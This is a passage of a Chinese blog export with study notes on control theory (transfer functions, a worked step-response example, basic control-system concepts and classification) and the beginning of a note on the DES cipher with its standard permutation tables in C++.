a_n\frac{\mathrm{d}^nr(t)}{\mathrm{d}t^n}+a_{n-1}\frac{\mathrm{d}^{n-1}r(t)}{\mathrm{d}t^{n-1}}+\cdots+a_0r(t)=b_n\frac{\mathrm{d}^nc(t)}{\mathrm{d}t^n}+b_{n-1}\frac{\mathrm{d}^{n-1}c(t)}{\mathrm{d}t^{n-1}}+\cdots+b_0c(t)
\]</span> 对两端进行拉普拉斯变换，可得 <span class="math display">\[
(a_ns^n+a_{n-1}s^{n-1}+\cdots+a_1s+a_0)R(s)=(b_ns^n+b_{n-1}s^{n-1}+\cdots+b_1s+b_0)C(s)
\]</span> 定义，系统的<strong>传递函数</strong>为 <span class="math display">\[
\frac{C(s)}{R(s)}=\frac{b_ns^n+b_{n-1}s^{n-1}+\cdots+b_1s+b_0}{a_ns^n+a_{n-1}s^{n-1}+\cdots+a_1s+a_0}
\]</span> 即输出量的拉氏变换与输入量的拉氏变换之比。</p>
<p><strong>传递函数</strong>定义在<strong>零初始条件</strong>下，即</p>
<ol type="1">
<li>输入是在 <span class="math inline">\(t=0\)</span>
以后才作用于系统的，即当 <span class="math inline">\(t\leq0\)</span>
时，输入量及其各阶导数均为 0。</li>
<li>输入作用于系统之前，当 <span class="math inline">\(t\leq0\)</span>
时，输出量及其各阶导数均为 0。</li>
</ol>
<p>这样定义有利于简化运算和比较系统性能。</p>
<h4 id="增益">增益</h4>
<p>根据传递函数的不同，我们可以把传递函数标准化。</p>
<blockquote>
<p>首先要有一个前提，在负反馈闭环系统的传递函数中，分子的次数要低于分母的次数。</p>
</blockquote>
<p>有两种标准化方式：</p>
<ul>
<li><strong>首 1 标准型</strong>：分母的最高次数的系数为 1。</li>
<li><strong>尾 1 标准型</strong>：分子和分母的常系数为 1。</li>
</ul>
<p>首 1 标准型主要应用于根轨迹的绘制；而尾 1 标准型主要应用于 bode
图的绘制。</p>
<p>一般<strong>尾 1
标准型</strong>的整体系数是我们关注的<strong>增益</strong>。</p>
<p>例如 <span class="math display">\[
G(s)=\frac{4s-4}{s^3+3s^2+2s}=2\cdot\frac{s-1}{s(\frac{1}{2}s+1)(s+1)}
\]</span> 故我们称这个系统的增益为 <span class="math inline">\(K=2\)</span>。</p>
<h4 id="传递函数的性质">传递函数的性质</h4>
<p>传递函数的<strong>性质</strong>：</p>
<ol type="1">
<li>由于实际上的物理系统总是存在惯性，并且能源功率有限，所以实际系统的传递函数的分母阶次总是大于或等于分子阶次。</li>
<li>传递函数只取决于系统或元件自身的结构和参数，与输入输出无关</li>
<li>传递函数与微分方程有直接联系</li>
<li>记 <span class="math inline">\(k(t)\)</span>
为系统单位脉冲响应，那么 <span class="math inline">\(G(s)=\mathscr{L}[k(t)]\)</span>，即系统的传递函数是系统单位脉冲响应的拉氏变换</li>
<li><span class="math inline">\(G(s)\)</span> 与 <span class="math inline">\(s\)</span> 复平面上的零极点图相对应</li>
</ol>
<blockquote>
<p>传递函数 <span class="math inline">\(G(s)\)</span>
分子为零的解为<strong>零点</strong>，分母为零的解为<strong>极点</strong>。</p>
</blockquote>
<p>传递函数的<strong>局限性</strong>：</p>
<ol type="1">
<li>传递函数的定义在零初始条件下，故不能反映非零初始条件下系统的全部运动规律</li>
<li>传递函数只适合于描述单变量系统（单输入-单输出）</li>
<li>传递函数是由拉氏变换定义的，只适用于定常系统</li>
</ol>
<h4 id="实例">实例</h4>
<h5 id="r-l-c-无源网络-1">R-L-C 无源网络</h5>
<p>已知系统微分方程为 <span class="math display">\[
LC\frac{\mathrm{d}^{2} u_{c}(t)}{\mathrm{d} t^{2}}+RC\frac{\mathrm{d}
u_{c}(t)}{\mathrm{d} t}+u_{c}(t)=u_{r}(t)
\]</span> 对两端取拉氏变换可得传递函数为 <span class="math display">\[
G(s)=\frac{U_c(s)}{U_r(s)}=\frac{1}{LCs^2+RCs+1}
\]</span></p>
<h5 id="电位器">电位器</h5>
<p>电位器可以把线位移或角位移变换成电压量。</p>
<p>单个电位器常用作信号变换装置。</p>
<figure>
<img src="/control-system-mathematical-model/电位器.png" alt="电位器">
<figcaption aria-hidden="true">电位器</figcaption>
</figure>
<p>一对电位器可组成误差检测器。</p>
<figure>
<img src="/control-system-mathematical-model/误差检测器.png" alt="误差检测器">
<figcaption aria-hidden="true">误差检测器</figcaption>
</figure>
<p>其中电位器的传递系数（传递常数）记为 <span class="math inline">\(K_1\)</span>，即 <span class="math display">\[
G(s)=\frac{U(s)}{\Delta\Theta(s)}=K_1
\]</span>
需要注意的是电位器会有<strong>负载效应</strong>，即在元件输出端接有负载时所产生的影响，此时输出电压
<span class="math inline">\(u(t)\)</span> 与电刷角位移 <span class="math inline">\(\theta(t)\)</span> 不再保持线性关系，如果负载电阻
<span class="math inline">\(R_L\)</span> 很大，则可以近似得到 <span class="math display">\[
u(t)\approx K_1\theta(t)
\]</span></p>
<h5 id="自整角机">自整角机</h5>
<p>自整角机是角位移传感器，在随动系统中总是成对使用的。按照用途不同分为力矩式和控制式。</p>
<p>自整角机的传递系数（传递常数）记为 <span class="math inline">\(K_s\)</span>，即 <span class="math display">\[
e(t)=K_s\cos{\Delta\theta}\sin{\omega t}
\]</span> 在 <span class="math inline">\(\Delta \theta\)</span>
较小的情况下，近似有 <span class="math display">\[
E\approx K_s\Delta\theta
\]</span>
自整角机与电位器组成的误差角检测器有相同的功能，故功能框图形式相同</p>
<figure>
<img src="/control-system-mathematical-model/自整角机结构图.png" alt="自整角机结构图">
<figcaption aria-hidden="true">自整角机结构图</figcaption>
</figure>
<h5 id="测速发电机">测速发电机</h5>
<p>测速发电机的转子与待测设备的转轴相连，无论是直流或交流测速发电机，其输出电压均正比于转子的角速度，故其微分方程可写为
<span class="math display">\[
u=K_t\omega=K_t\frac{\mathrm{d}\theta}{\mathrm{d}t}
\]</span> 其中 <span class="math inline">\(K_t\)</span>
是测速发电机输出电压的斜率，也是传递常数。</p>
<p>其传递函数为 <span class="math display">\[
G(s)=\frac{U(s)}{\Theta(s)}=K_t
\]</span> 或者为 <span class="math display">\[
G(s)=\frac{U(s)}{\Theta(s)}=K_ts
\]</span> 当输入量取转速 <span class="math inline">\(\omega(t)\)</span>
时用前者；输入量取转角 <span class="math inline">\(\theta(t)\)</span>
时用后者。</p>
<h5 id="电枢控制式直流电动机">电枢控制式直流电动机</h5>
<p>直流电动机的微分方程为 <span class="math display">\[
T_{m} \frac{\mathrm{d} \omega_{m}(t)}{\mathrm{d} t}+\omega_{m}(t)=K_{a}
u_{a}(t)
\]</span> <img src="/control-system-mathematical-model/直流电动机结构图.png" alt="直流电动机结构图"></p>
<figure>
<img src="/control-system-mathematical-model/测速发电机结构图.png" alt="测速发电机结构图">
<figcaption aria-hidden="true">测速发电机结构图</figcaption>
</figure>
<p>得到电枢控制直流电动机的传递函数为 <span class="math display">\[
G_a(s)=\frac{\Omega(s)}{U_a(s)}=\frac{K_a}{T_ms+1}
\]</span> 如果输出用角位移 <span class="math inline">\(\theta(t)\)</span> 表示，则传递函数可以表示为
<span class="math display">\[
G_a(s)=\frac{\Omega(s)}{U_a(s)}=\frac{K_a}{s(T_ms+1)}
\]</span></p>
<h5 id="两相异步电动机">两相异步电动机</h5>
<figure>
<img src="/control-system-mathematical-model/两相异步电动机及其特性曲线.png" alt="两相异步电动机及其特性曲线">
<figcaption aria-hidden="true">两相异步电动机及其特性曲线</figcaption>
</figure>
<p>通常机械特性的<strong>线性化方程</strong>可表示为： <span class="math display">\[
M_m=-C_\Omega\omega_m+M_s
\]</span> 其中，<span class="math inline">\(M_m\)</span>
为电动机输出转矩；<span class="math inline">\(\omega_m\)</span>
为电动机角速度；<span class="math inline">\(C_\Omega\)</span>
为粘性摩擦系数；<span class="math inline">\(M_m\)</span>
为堵转转矩。</p>
<h3 id="例题">例题</h3>
<h4 id="题干">题干</h4>
<p>已知某系统在零初始条件下的单位阶跃响应为 <span class="math display">\[
c(t)=1-\frac{2}{3}e^{-t}-\frac{1}{3}e^{-4t}
\]</span> 求</p>
<ol type="1">
<li>系统的传递函数</li>
<li>系统的增益</li>
<li>系统的特征根及相应的模态</li>
<li>画出对应的零极点图</li>
<li>求系统的单位脉冲响应</li>
<li>求系统微分方程</li>
<li>当 <span class="math inline">\(c(0)=-1,c&#39;(0)=0,r(t)=1(t)\)</span>
时，系统的响应</li>
</ol>
<h4 id="系统的传递函数">系统的传递函数</h4>
<p>系统的传递函数定义在零初始条件下，同时由传递函数的定义得知 <span class="math display">\[
G(s)=\frac{C(s)}{R(s)}
\]</span> 其中，<span class="math inline">\(C(s)\)</span>
是响应（输出）的拉氏变换方程，<span class="math inline">\(R(s)\)</span>
是激励（输入）的拉氏变换方程。</p>
<p>对零初始条件下的单位阶跃响应进行拉氏变换，得到 <span class="math display">\[
C(s)=\frac{1}{s}-\frac{2}{3}\frac{1}{s+1}-\frac{1}{3}\frac{1}{s+4}=\frac{2(s+2)}{s(s+1)(s+4)}
\]</span> 我们知道激励信号 <span class="math inline">\(r(t)=1(t)\)</span>，那么其拉氏变换 <span class="math display">\[
R(s)=\frac{1}{s}
\]</span> 故 <span class="math display">\[
G(s)=\frac{2(s+2)}{(s+1)(s+4)}
\]</span></p>
<h4 id="系统的增益">系统的增益</h4>
<p>由尾 1 标准型得知，系统的增益 <span class="math display">\[
K=\frac{2\times2}{4}=1
\]</span></p>
<h4 id="系统的特征根及其模态">系统的特征根及其模态</h4>
<p>由系统零初始条件下的单位阶跃响应可以得知，模态有 <span class="math display">\[
e^{-t},e^{-4t}
\]</span> 故得知其特征根为 <span class="math display">\[
\lambda_1=-1,\lambda_2=-4
\]</span></p>
<blockquote>
<p>在这里也可以通过传递函数分母的解得知，传递函数分母的解为系统的特征根。</p>
</blockquote>
<h4 id="零极点图">零极点图</h4>
<p>传递函数 <span class="math inline">\(G(s)\)</span>
分子为零的解为<strong>零点</strong>，分母为零的解为<strong>极点</strong>。</p>
<p>那么我们可以知道，极点有 <span class="math inline">\(-1,-4\)</span>；零点有 <span class="math inline">\(-2\)</span>。</p>
<figure>
<img src="/control-system-mathematical-model/s复平面下的零极点图.png" alt="s复平面下的零极点图">
<figcaption aria-hidden="true">s复平面下的零极点图</figcaption>
</figure>
<h4 id="单位脉冲响应">单位脉冲响应</h4>
<p>我们由传递函数的性质可知，传递函数就是系统单位脉冲响应的拉氏变换，即
<span class="math display">\[
\mathscr{L}[k(t)]=G(s)
\]</span> 那么我们对传递函数进行拉氏逆变换，有 <span class="math display">\[
G(s)=\frac{2}{3}\frac{1}{s+1}+\frac{4}{3}\frac{1}{s+4}\\
k(t)=\mathscr{L}^{-1}[G(s)]=\frac{2}{3}e^{-t}+\frac{4}{3}e^{-4t}
\]</span></p>
<blockquote>
<p>在信号与系统中，我们也可以知道，单位脉冲响应就是单位阶跃响应的微分。</p>
</blockquote>
<h4 id="系统微分方程">系统微分方程</h4>
<p>我们化一下传递函数，得到 <span class="math display">\[
(s^2+5s+4)C(s)=(2s+4)R(s)
\]</span> 对方程两边进行拉氏逆变换（<strong>零初始条件</strong>），得到
<span class="math display">\[
c&#39;&#39;(t)+5c&#39;(t)+4c(t)=2r&#39;(t)+4r(t)
\]</span></p>
<h4 id="系统的响应">系统的响应</h4>
<p>对系统微分方程进行拉氏变换（<strong>有初始条件</strong>），得到 <span class="math display">\[
[s^2C(s)-sc(0)-c&#39;(0)]+5[sC(s)-c(0)]+4C(s)=2(s+2)R(s)
\]</span> 我们进行化简得到 <span class="math display">\[
C(s)=\frac{2(s+2)}{s^2+5s+4}\frac{1}{s}-\frac{s+5}{s^2+5s+4}=\frac{-s^2-3s+4}{s(s+1)(s+4)}
\]</span> 其中自由相应部分（零输入响应）为 <span class="math display">\[
C_0(s)=-\frac{s+5}{(s+1)(s+4)}=\frac{-4}{3}\frac{1}{s+1}+\frac{1}{3}\frac{1}{s+4}
\]</span> 故 <span class="math display">\[
c_0(t)=\frac{-4}{3}e^{-t}+\frac{1}{3}e^{-4t}
\]</span> 而零初始条件下的单位阶跃响应（零状态响应）题目已经给出，故
<span class="math display">\[
c(t)=(1-\frac{2}{3}e^{-t}-\frac{1}{3}e^{-4t})+(\frac{-4}{3}e^{-t}+\frac{1}{3}e^{-4t})=1-2e^{-t}
\]</span></p>
]]></content>
  </entry>
  <entry>
    <title>自动控制系统-控制系统</title>
    <url>//control-system.html</url>
    <content><![CDATA[<h1 id="自动控制原理">自动控制原理</h1>
<h2 id="控制系统的一般概念">控制系统的一般概念</h2>
<h3 id="控制理论">控制理论</h3>
<p>自动控制理论是研究<strong>自动控制系统</strong>组成，进行<strong>系统分析设计</strong>的一般性理论，是研究<strong>自动控制过程共同规律</strong>的技术学科。</p>
<h4 id="经典控制理论">经典控制理论</h4>
<ul>
<li>时域法</li>
<li>复域法（根轨迹法）</li>
<li>频域法</li>
</ul>
<h4 id="现代控制理论">现代控制理论</h4>
<ul>
<li>线性系统</li>
<li>最优控制</li>
<li>最佳估计</li>
<li>系统辨识</li>
</ul>
<h3 id="基本概念">基本概念</h3>
<p>基本控制方式有三种：</p>
<ol type="1">
<li>开环控制</li>
<li>闭环控制</li>
<li>复合控制</li>
</ol>
<p>其中在自动控制系统中最重要的是闭环控制。</p>
<p>而<strong>构成闭环控制系统的核心是负反馈原理</strong>。</p>
<p>闭环负反馈控制系统的特点有：</p>
<ol type="1">
<li>系统内部存在反馈，信号流动构成闭回路</li>
<li>偏差起调节作用</li>
</ol>
<h3 id="基本组成">基本组成</h3>
<h4 id="定义">定义</h4>
<p>任何一个自动控制系统都是由<strong>被控对象</strong>和<strong>控制器</strong>构成的。一个典型的自动控制系统的<strong>功能框图</strong>如下。</p>
<figure>
<img src="/control-system/典型反馈控制系统方框图.png" alt="典型反馈控制系统方框图">
<figcaption aria-hidden="true">典型反馈控制系统方框图</figcaption>
</figure>
<ul>
<li><p><strong>被控对象</strong>：一般是指生产过程中需要进行控制的工作机械、装置或生产过程。描述<strong>被控对象工作状态的、需要进行控制的</strong>物理量就是被控量。</p></li>
<li><p><strong>给定元件</strong>：主要用于<strong>产生给定信号或控制输入信号</strong>。例如直流电动机转速控制系统中的<strong>电位器</strong>。</p></li>
<li><p><strong>测量元件</strong>：用于<strong>检测被控量或输出量，产生反馈信号</strong>。如果测出的物理量属于非电量，般要转换成电量以便处理。例如直流电动机转速控制系统中的<strong>测速发电机</strong>。</p></li>
<li><p><strong>比较元件</strong>：用来<strong>比较输入信号和反馈信号之间的偏差</strong>。它可以是一个差动电路，也可以是一个物理元件(如电桥电路、差动放大器、自整角机等)。</p></li>
<li><p><strong>放大元件</strong>：用来<strong>放大偏差信号的幅值和功率</strong>，使之能够<strong>推动执行机构调节被控对象</strong>，例如功率放大器、电液伺服阀等。</p></li>
<li><p><strong>执行机构</strong>：用于<strong>直接对被控对象进行操作，调节被控量</strong>，例如阀门、伺服电动机等。</p></li>
<li><p><strong>校正元件</strong>：用来<strong>改善或提高系统的性能</strong>。常用串联或反馈的方式连接在系统中,例如
RC 网络、测速发电机等。</p></li>
</ul>
<p>在这之中我们关注<strong>放大元件</strong>、<strong>校正装置</strong>和<strong>给定元件</strong>。</p>
<h4 id="实例">实例</h4>
<h5 id="电压调节系统">电压调节系统</h5>
<figure>
<img src="/control-system/电压调节系统原理图.png" alt="电压调节系统原理图">
<figcaption aria-hidden="true">电压调节系统原理图</figcaption>
</figure>
<p>可在系统中，发电机是<strong>被控对象</strong>，发电机的输出电压是<strong>被控量</strong>，给定电位器设定的电压
<span class="math inline">\(u_t\)</span> 是<strong>给定量</strong>。</p>
<figure>
<img src="/control-system/电压调节系统方框图.png" alt="电压调节系统方框图">
<figcaption aria-hidden="true">电压调节系统方框图</figcaption>
</figure>
<h5 id="函数记录仪">函数记录仪</h5>
<figure>
<img src="/control-system/函数记录仪工作原理图.png" alt="函数记录仪工作原理图">
<figcaption aria-hidden="true">函数记录仪工作原理图</figcaption>
</figure>
<p>测速发电机是<strong>校正元件</strong>，它测量电动机转速并进行反馈，用以增加阻尼，改善系统性能。</p>
<figure>
<img src="/control-system/函数记录仪控制系统方框图.png" alt="函数记录仪控制系统方框图">
<figcaption aria-hidden="true">函数记录仪控制系统方框图</figcaption>
</figure>
<h5 id="火炮方位角控制系统">火炮方位角控制系统</h5>
<figure>
<img src="/control-system/火炮方位角控制系统示意图.png" alt="火炮方位角控制系统示意图">
<figcaption aria-hidden="true">火炮方位角控制系统示意图</figcaption>
</figure>
<p>火炮是<strong>被控对象</strong>，火炮方位角 <span class="math inline">\(\theta_o\)</span>
是<strong>被控量</strong>，手柄给定的方位角 <span class="math inline">\(\theta_i\)</span> 是<strong>给定量</strong>。</p>
<figure>
<img src="/control-system/火炮方位角控制系统方框图.png" alt="火炮方位角控制系统方框图">
<figcaption aria-hidden="true">火炮方位角控制系统方框图</figcaption>
</figure>
<h5 id="飞机-自动驾驶系统">飞机-自动驾驶系统</h5>
<figure>
<img src="/control-system/飞机-自动驾驶系统原理图.png" alt="飞机-自动驾驶系统原理图">
<figcaption aria-hidden="true">飞机-自动驾驶系统原理图</figcaption>
</figure>
<p>飞机是<strong>被控对象</strong>，俯仰角是<strong>被控量</strong>，放大器、舵机、垂直陀螺仪、反馈电位计等组成<strong>控制系统</strong>，给定的常值俯仰角是<strong>参考量</strong>。</p>
<figure>
<img src="/control-system/俯仰角控制系统方框图.png" alt="俯仰角控制系统方框图">
<figcaption aria-hidden="true">俯仰角控制系统方框图</figcaption>
</figure>
<h3 id="分类">分类</h3>
<h4 id="按给定信号的形式不同">按给定信号的形式不同</h4>
<ul>
<li><strong>恒值控制系统</strong>（定值系统/调节系统）：<strong>控制输入是恒定值，要求被控量保持给定值不动</strong>，例如液位控制系统、直流电动机调速系统等。</li>
<li><strong>随动控制系统</strong>（伺服系统）：<strong>控制输入是变化规律未知的时间函数</strong>（<span class="math inline">\(f_{in}(t)\)</span>
是关于时间的函数）<strong>，要求被控量按同样的规律变化，并与输入信号的误差保持在规定范围内</strong>，例如函数记录仪、控制火炮系统等。</li>
<li><strong>程序控制系统</strong>：<strong>给定信号按预先编制的程序确定，要求被控量按相应的规律随控制信号变化</strong>，例如机械加工中的数控机床。</li>
</ul>
<h4 id="按系统参数是否随时间变化">按系统参数是否随时间变化</h4>
<ul>
<li><strong>时不变系统</strong>（定常系统）：控制系统的参数在系统运行过程中<strong>不随时间变化</strong>（实际上一般是针对系统参数的变化相对于系统的运动<strong>缓慢得多</strong>的系统来近似讨论）</li>
<li><strong>时变系统</strong>：控制系统的参数在系统运行过程中<strong>随时间变化</strong></li>
</ul>
<h4 id="按系统是否满足叠加原理">按系统是否满足叠加原理</h4>
<ul>
<li><strong>线性系统</strong>：<strong>由线性元件组成的系统，系统的运动方程能用线性微分方程描述</strong>。主要特点是具有<strong>齐次性</strong>和<strong>叠加性</strong>，<strong>系统响应与初始状态无关</strong>，<strong>系统的稳定性与输入信号无关</strong>。</li>
<li><strong>非线性系统</strong>：<strong>含有一个以上的非线性元件</strong>所组成的系统，特点是<strong>不满足叠加原理，系统响应与初始状态和外作用都有关系</strong>。‘</li>
</ul>
<h4 id="按信号是否连续">按信号是否连续</h4>
<ul>
<li><strong>连续系统</strong>：系统中各部分信号都是连续函数形式的模拟量。</li>
<li><strong>离散系统</strong>（采样系统或数字系统）：系统中有一处或几处的信号是离散信号（脉冲序列或数码）。例如计算机控制系统。</li>
</ul>
<h4 id="按输入输出信号的数目">按输入输出信号的数目</h4>
<ul>
<li><strong>单变量系统</strong>：系统中只有<strong>一个输入和一个输出</strong>。（可以视为多变量系统的特例）</li>
<li><strong>多变量系统</strong>：系统中有<strong>多个输入或多个输出</strong>。</li>
</ul>
<blockquote>
<p>自动控制系统的要求：<strong>稳</strong>、<strong>准</strong>、<strong>快</strong></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>DES 算法笔记</title>
    <url>//des-note.html</url>
    <content><![CDATA[<h1 id="des-算法简述">DES 算法简述</h1>
<p>DES算法是一种最通用的对称密钥算法，因为算法本身是公开的，所以其安全性在于密钥的安全性。基于密钥的算法通常有两类：对称算法和公开密钥算法。对称算法的对称性体现在加密密钥能够从解密密钥推算出来，反之亦然。在大多数对称算法中，加解密的密钥是相同的，DES就是这样。可见，对称密钥算法的加解密密钥都是保密的。而公开密钥算法的加密密钥是公开的，解密密钥是保密的。</p>
<p>下面是 DES 加密算法的整体流程图：</p>
<figure>
<img src="/des-note/DES%20流程图.png" alt="DES 流程图">
<figcaption aria-hidden="true">DES 流程图</figcaption>
</figure>
<p>从流程图中可以看出，DES 明显基于 Feistel 密码结构，其中 f
为轮函数。</p>
<p>并且需要注意到，事实上密钥只有 56bits 参与了 DES
算法（其中第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个
1），分组后的明文组和56位的密钥按位替代或交换的方法形成密文组。</p>
<h1 id="des-算法描述">DES 算法描述</h1>
<h2 id="初始置换-ip">初始置换 <span class="math inline">\(IP\)</span></h2>
<p>将输入的 64bits 明文重新进行排序，即将第 58 位放到第 1 位，第 50
位放到第 2 位，并且以此类推，最终有一个 8x8 的置换表如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始置换表 IP</span></span><br><span class="line"><span class="type">int</span> IP[] = &#123; <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">			 <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">			 <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">			 <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">			 <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,  <span class="number">1</span>,</span><br><span class="line">			 <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">			 <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">			 <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span> &#125;;</span><br></pre></td></tr></table></figure>
<p>置换后，<span class="math inline">\(L_0\)</span> 为新数据的左
32bits，<span class="math inline">\(R_0\)</span> 为新数据的右
32bits，即分为高、低32位。</p>
<h2 id="密钥置换-子密钥-k_i-的获取">密钥置换 (子密钥 <span class="math inline">\(K_i\)</span> 的获取)</h2>
<p>密钥置换将从原始的 56 位密钥中得到 16 个子密钥 (轮密钥) <span class="math inline">\(k_i\)</span>，其中每个子密钥 <span class="math inline">\(k_i\)</span> 都是 48 位。</p>
<p>首先注意到 DES 的输入密钥通常是 64 位，其中每第 8 个位都作为前面 7
位的一个<strong>奇校验位</strong>。但校验位并不会增加密码安全性，所以因为此可以说
DES 的密钥是 56 位的，而不是 64 位的。</p>
<p>于是首先我们需要通过忽略所有第 8 位的方式将 64 位密钥缩短为 56
位。示意图如下：</p>
<figure>
<img src="/des-note/奇校验位.png" alt="奇校验位">
<figcaption aria-hidden="true">奇校验位</figcaption>
</figure>
<p>而置乱使用的表如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 密钥置换表，将64位密钥压缩为56位</span></span><br><span class="line"><span class="type">int</span> PC_1[] = &#123;<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">			   <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">			  <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">			  <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">			  <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">			   <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">			  <span class="number">14</span>,  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">			  <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>以上被称为第一次置换。</p>
<p>然后要将得到的 56 位密钥将分为 <span class="math inline">\(C_0\)</span> 和 <span class="math inline">\(D_0\)</span> 两部分，同时长度均为 28
位的左右两部分将周期性地向左移动<strong>一位或两位</strong>
(即循环移位)，而移动的具体位数取决于轮数 <span class="math inline">\(i\)</span>，规则如下：</p>
<ul>
<li>在第 <span class="math inline">\(i=1,2,9,16\)</span>
轮中，左右两部分向左移动一位</li>
<li>在 <span class="math inline">\(i\neq 1,2,9,16\)</span>
的其他轮种，左右两部分向左移动两位</li>
</ul>
<blockquote>
<p>循环移动的位置的总数位 <span class="math inline">\(4·1+12·2=28\)</span>，这将带来一个有趣的属性，即
<span class="math inline">\(C_0=C_{16}\)</span> 和 <span class="math inline">\(D_0=D_{16}\)</span>。而这对解密密钥编排
(其中子密钥都是逆序生成的) 非常有用。</p>
</blockquote>
<p><span class="math inline">\(k_i\)</span> 的第二次置换过程图如下：</p>
<figure>
<img src="/des-note/DES%20密钥置换.png" alt="DES 密钥置换">
<figcaption aria-hidden="true">DES 密钥置换</figcaption>
</figure>
<blockquote>
<p>例如对于 01010111 循环移位两位的结果为 01011101</p>
</blockquote>
<p>为了得到 48 位的轮密钥 <span class="math inline">\(k_i\)</span>，左右两部分需要再次进行压缩置换
(第二次置换)。</p>
<p>因为这个过程中，即<strong>置换了每位的顺序</strong>，又<strong>选择了子密钥</strong>，因此称为压缩置换
(注意表中没有 9，18，22，25，35，38，43 和 54
共八位)。压缩置换表如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 压缩置换，将56位密钥压缩为48位子密钥</span></span><br><span class="line"><span class="type">int</span> PC_2[] = &#123;<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>,  <span class="number">1</span>,  <span class="number">5</span>,</span><br><span class="line">			   <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>,  <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">			  <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">26</span>,  <span class="number">8</span>,</span><br><span class="line">			  <span class="number">16</span>,  <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>,  <span class="number">2</span>,</span><br><span class="line">			  <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">			  <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">			  <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">			  <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>同时每轮左移的位数如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 每轮左移的位数</span></span><br><span class="line"><span class="type">int</span> shiftBits[] = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>最后通过不断的左移后压缩置换，我们依次得到了 <span class="math inline">\(k_1,k_2\cdots
k_{16}\)</span>。(上一次的输出为下一次的输入)</p>
<h2 id="轮函数-f">轮函数 <span class="math inline">\(f\)</span></h2>
<p>在第 <span class="math inline">\(i\)</span> 轮种，<span class="math inline">\(f\)</span> 函数的输入为前一轮输出的右半部分 <span class="math inline">\(R_{i-1}\)</span> 和当前轮密钥 <span class="math inline">\(k_i\)</span>。</p>
<p><span class="math inline">\(f\)</span>
函数的输出将被作异或掩码，用来加密左半部分输入位 <span class="math inline">\(L_{i-1}\)</span>，即与左半部分异或。</p>
<p><span class="math inline">\(f\)</span> 函数结构如图所示：</p>
<figure>
<img src="/des-note/轮函数对应框图.png" alt="轮函数对应框图">
